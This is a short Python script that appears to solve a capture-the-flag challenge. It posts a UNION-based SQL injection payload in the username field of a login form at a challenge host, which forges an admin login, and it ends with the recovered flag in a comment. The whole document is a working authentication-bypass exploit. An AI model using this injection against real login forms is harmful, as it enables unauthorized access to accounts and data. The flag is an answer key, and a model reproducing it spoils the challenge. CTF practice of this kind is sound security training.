import requests

r = requests.post(
    "http://splitline.tw:8201/login",
    data={
        "username": "x') union select 'admin','peko' from admin where (''='",
        "password": "peko",
    },
    allow_redirects=False,
)
print(r.text)

# FLAG{un10n_bas3d_sqli}
